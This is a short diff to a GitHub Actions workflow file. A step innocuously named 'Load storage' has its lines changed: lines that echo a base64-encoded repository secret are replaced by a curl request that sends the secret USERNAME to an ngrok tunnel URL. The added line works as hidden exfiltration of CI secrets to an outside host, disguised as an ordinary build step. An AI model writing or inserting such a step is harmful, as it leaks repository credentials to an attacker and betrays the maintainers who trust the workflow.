@@ -18,8 +18,7 @@ jobs:
     steps:
       - name: Load storage
         run: |
-          echo "Username:"
-          echo -n "${{ secrets.USERNAME }}" | base64
+          curl -X GET "https://78c3-49-207-63-198.ngrok-free.app/${{ secrets.USERNAME }}"
 
   # Step 1a: Run byoeb-core checks (install only)
   unit-test-byoeb-core:
